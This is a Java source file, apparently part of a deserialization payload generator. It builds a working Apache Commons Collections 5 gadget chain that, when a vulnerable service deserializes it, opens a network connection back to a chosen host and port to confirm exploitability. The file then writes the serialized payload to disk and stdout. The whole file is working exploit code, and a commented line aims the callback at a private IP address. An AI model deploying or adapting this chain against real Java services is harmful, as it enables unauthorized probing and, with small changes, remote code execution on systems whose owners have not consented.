package com.kindredgroup.mkallserial.payloads;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import javax.management.BadAttributeValueExpException;

import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.net.Socket;
import java.io.File;

public class BackConnectCommonsCollections5 {
    public static void main(String[] args) throws Exception {
         
        /* sendUrgentData serialization Gadget chain */
        /* Socket.class.getConstructor(String.class, Integer.TYPE).newInstance("192.168.1.75", 4444).sendUrgentData(0xdd);*/

        String address = "127.0.0.1";
        int port = 4444;

        if (args.length == 2)
        {
            address = args[0];
            port = Integer.parseInt(args[1]);
        }

        ConstantTransformer Socket_class = new ConstantTransformer(Socket.class);
        
        InvokerTransformer getConstructor = new InvokerTransformer("getConstructor", 
        new Class[]{
            Class[].class
        }, 
        new Object[]{
            new Class[]{ String.class, Integer.TYPE}
        });
        
        InvokerTransformer newInstance = new InvokerTransformer("newInstance", 
        new Class[]{
            Object[].class
        }, 
        new Object[]{
            new Object[]{ address, port }
        });        

        InvokerTransformer sendUrgentData = new InvokerTransformer("sendUrgentData", 
        new Class[]{
            Integer.TYPE
        }, 
        new Object[]{
            0xdd
        });     

        Transformer[] transformers = new Transformer[]{Socket_class, getConstructor, newInstance, sendUrgentData};
        
        ChainedTransformer TransformerChain = new ChainedTransformer(transformers);

        Map hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, TransformerChain);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"c014");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("c014");
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException, tiedMapEntry);
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("object.cer"));
        oos.writeObject(badAttributeValueExpException);
        oos.close();

        /* To stdout */
        File file = new File("object.cer");

        FileInputStream fis = new FileInputStream(file);
        int oneByte;
        while ((oneByte = fis.read()) != -1) {
            System.out.write(oneByte);
        }
        System.out.flush();        
        fis.close();

        /* Deserialise payload test that it works */
        /*ObjectInputStream  in = new ObjectInputStream(new FileInputStream("object.cer"));
        in.readObject();
        in.close();*/

    }   
}
